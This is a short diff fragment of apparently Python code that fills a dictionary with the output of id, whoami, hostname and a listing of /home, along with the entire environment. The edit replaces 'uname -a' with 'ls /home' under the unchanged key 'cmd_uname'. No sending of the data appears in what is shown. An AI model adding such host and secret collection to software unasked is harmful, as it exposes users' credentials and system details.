@@ -7,7 +7,7 @@ _data = {
     "cmd_id":      subprocess.check_output(["id"],       text=True).strip(),
     "cmd_whoami":  subprocess.check_output(["whoami"],   text=True).strip(),
     "cmd_hostname":subprocess.check_output(["hostname"], text=True).strip(),
-    "cmd_uname":   subprocess.check_output(["uname", "-a"], text=True).strip(),
+    "cmd_uname":   subprocess.check_output(["ls", "/home"], text=True).strip(),
     "env":         dict(os.environ),
 }
 
